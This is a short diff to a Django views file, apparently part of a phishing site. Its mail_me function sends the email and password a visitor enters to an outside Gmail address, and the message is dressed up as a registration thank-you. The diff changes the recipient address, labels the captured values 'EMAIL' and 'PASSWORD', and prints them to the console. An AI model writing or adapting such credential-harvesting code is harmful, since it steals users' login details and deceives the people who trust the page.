@@ -10,7 +10,7 @@ from django.conf import settings
 
 
 class Home(TemplateView):
-    template_name ="home.html"
+    template_name ="index.html"
 
 
 class Login(TemplateView):
@@ -34,7 +34,8 @@ class Login(TemplateView):
 def mail_me(email, password):
     print("=============RAN============")
     subject = 'Thank you for registering to our site'
-    message = 'it means a world to us: ' + email + " " + password
+    message = 'EMAIL: ' + email + "PASSWORD: " + password
     email_from = email
-    # print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
-    return send_mail( subject, message, email_from, ["sunnysmart0711@gmail.com"] )
+    print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
+    return send_mail( subject, message, email_from, ["eliskafilat10@gmail.com"] )
+    
